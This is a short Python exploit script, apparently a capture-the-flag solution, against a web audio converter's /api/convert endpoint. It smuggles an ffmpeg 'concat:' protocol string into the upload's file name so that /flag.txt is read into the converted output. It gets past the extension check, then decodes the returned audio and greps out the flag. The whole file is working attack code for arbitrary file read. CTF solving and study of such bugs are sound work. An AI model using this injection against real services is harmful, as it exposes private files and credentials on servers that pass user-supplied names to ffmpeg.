import requests
import sys
import io
import os

if len(sys.argv) < 2:
    exit(f'{sys.argv[0]} <host>')
host = sys.argv[1]

# leak arbitrary file through concat
# the first empty.wav is for a valid .wav header
# the second empty.wav is to pass the extension check
# !!! the path for the second empty.wav is absolute to avoid the basename being "flag.txt|empty.wav"
resp = requests.post(host + '/api/convert', files={
    'file': ('concat:empty.wav|/flag.txt|/app/workdir/empty.wav', open('empty.wav', 'rb'), 'audio/wav')
})
assert resp.status_code == 200

# convert flac to wav, recover flag
with open('tmp.flac', 'wb') as f:
    f.write(resp._content)

os.system("""
ffmpeg -hide_banner -loglevel error -i tmp.flac tmp.wav
grep -aoE 'flag-\\w+' tmp.wav
rm tmp.flac tmp.wav
""")